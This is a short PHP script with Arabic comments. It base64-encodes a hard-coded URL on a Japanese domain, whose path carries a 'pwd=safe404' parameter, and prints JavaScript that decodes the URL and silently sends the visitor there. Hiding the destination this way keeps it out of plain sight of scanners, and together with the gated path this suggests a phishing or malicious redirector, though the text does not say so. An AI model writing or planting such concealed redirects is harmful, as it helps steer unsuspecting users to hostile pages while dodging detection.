<?php
// تحديد الرابط المستهدف
$url = "https://pilica.co.jp/D2H2L/index.php?pwd=safe404";

// تشفير الرابط بقاعدة 64
$encoded_url = base64_encode($url);

// طباعة كود JavaScript لفك التشفير والتحويل
echo '<script>
(function(){
    var u = "' . $encoded_url . '";
    var link = atob(u);
    window.location.href = link;
})();
</script>';
?>
